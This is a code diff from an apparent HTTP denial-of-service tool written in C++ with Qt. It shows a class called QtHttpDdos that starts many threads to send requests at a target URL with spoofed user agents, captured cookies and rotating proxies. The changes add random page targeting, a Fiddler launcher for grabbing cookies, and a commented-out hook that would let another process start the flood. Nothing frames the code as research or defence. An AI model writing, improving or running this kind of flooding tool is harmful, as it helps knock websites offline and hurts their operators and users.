@@ -19,27 +19,31 @@
 #include <QSettings>
 #include <QProcess>
 
+#ifdef Q_OS_WIN
+#pragma comment(lib, "user32.lib")
+#include <qt_windows.h>
+#endif
 
+const ULONG_PTR CUSTOM_TYPE = 10000;
 QtHttpDdos::QtHttpDdos(QWidget *parent) :
     QWidget(parent),
     ui(new Ui::QtHttpDdos)
 {
 
     m_pIsProxyIp = false;
+    m_pRandPage = false;
     m_pFlushRequestCountTimer = new QTimer();
     m_pIsNewThread = true;
     connect(m_pFlushRequestCountTimer,SIGNAL(timeout()),this,
             SLOT(slot_flushRequestCount()));
 
     ui->setupUi(this);
+
 }
 
 QtHttpDdos::~QtHttpDdos()
 {
     delete m_pFlushRequestCountTimer;
-    for(int i = 0; i < m_pThreadList.length(); i++){
-        m_pThreadList.at(i)->deleteLater();
-    }
     delete ui;
 }
 
@@ -53,6 +57,33 @@ void QtHttpDdos::setCookies(const QString cookies)
     ui->cookieEdt->setText(cookies);
 }
 
+void QtHttpDdos::closeEvent(QCloseEvent *event)
+{
+    stopRequest();
+}
+////进程间通信
+//bool QtHttpDdos::nativeEvent(const QByteArray &eventType, void *message, long *result)
+//{
+//    MSG *param = static_cast<MSG *>(message);
+
+//        switch (param->message)
+//        {
+//        case WM_COPYDATA:
+//        {
+//            COPYDATASTRUCT *cds = reinterpret_cast<COPYDATASTRUCT*>(param->lParam);
+//            if (cds->dwData == CUSTOM_TYPE)
+//            {
+//                QString strMessage = QString::fromUtf8(reinterpret_cast<char*>(cds->lpData), cds->cbData);
+//                QMessageBox::information(this, QStringLiteral("提示"), strMessage);
+//                *result = 1;
+//                startRequest();
+//                return true;
+//            }
+//        }
+//        }
+//        return QWidget::nativeEvent(eventType, message, result);
+//}
+
 void QtHttpDdos::startRequest()
 {
     m_pFlushRequestCountTimer->start(100);
@@ -60,10 +91,12 @@ void QtHttpDdos::startRequest()
     QString ua = ui->uaEdt->toPlainText();
     QString cookie = ui->cookieEdt->toPlainText();
     int count = ui->runCountEdt->text().toInt();
+    //    this->thread()->setPriority(QThread::HighestPriority);
     //第一次点击开始，新建线程
     if(m_pIsNewThread){
         for(int i = 0;i < count; i++){
             QThread *thread = new QThread;
+
             m_pThreadList.enqueue(thread);
 
             QHttpThread *http_request = new QHttpThread(url,count,ua,cookie);
@@ -74,7 +107,6 @@ void QtHttpDdos::startRequest()
                     http_request->addProxyPort(m_pProxyPortList.at(j));
                 }
             }
-
             m_pHttpList.enqueue(http_request);
             http_request->moveToThread(thread);
         }
@@ -103,9 +135,16 @@ void QtHttpDdos::stopRequest()
 //开启线程
 void QtHttpDdos::startThread()
 {
+    if(m_pRandPage){
+        int start = ui->pageRangeStart->text().toInt();
+        int end = ui->pageRangeEnd->text().toInt();
+        for(int i = 0;i < m_pHttpList.length(); i++){
+            m_pHttpList.at(i)->setPageRange(start,end);
+        }
+    }
     for(int i = 0; i < m_pThreadList.length(); i++){
-        m_pHttpList.at(i)->run();
         m_pThreadList.at(i)->start();
+        m_pHttpList.at(i)->run();
     }
 }
 //开始/暂停请求
@@ -170,19 +209,23 @@ void QtHttpDdos::on_proxyIdRbtn_clicked(bool checked)
         m_pHttpList.at(i)->switchProxyIp(checked);
     }
 }
-
+//打开抓包工具
 void QtHttpDdos::on_getCookieBtn_clicked()
 {
-
     QProcess   process(this);
     process.startDetached("Fiddler2/Fiddler.exe");
-
 }
-
+//打开网页
 void QtHttpDdos::on_openUrl_clicked()
 {
     MainWindow *main = new MainWindow(this);
     QString url = ui->urlEdt->text();
     main->navigate(url);
     main->show();
+}
+
+//确定是否使用分页
+void QtHttpDdos::on_surePageRange_clicked(bool checked)
+{
+    m_pRandPage = checked;
 }
